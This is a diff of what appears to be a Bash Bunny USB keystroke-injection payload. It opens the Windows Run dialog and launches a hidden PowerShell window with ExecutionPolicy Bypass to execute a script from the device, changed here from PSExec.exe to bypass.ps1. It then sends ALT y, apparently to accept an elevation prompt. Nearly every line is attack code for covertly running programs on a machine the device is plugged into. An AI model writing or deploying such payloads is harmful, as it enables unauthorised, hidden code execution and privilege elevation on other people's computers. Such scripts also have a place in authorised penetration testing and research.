@@ -17,7 +17,7 @@ LED B 500
 DELAY 1000
 GUI R
 DELAY 1000
-RUN WIN "powerShell -windowstyle hidden -ExecutionPolicy Bypass .((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\PSExec.exe')"
+RUN WIN "powerShell -windowstyle hidden -ExecutionPolicy Bypass .((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\bypass.ps1')"
 LED G 0
 DELAY 5000
 ALT y
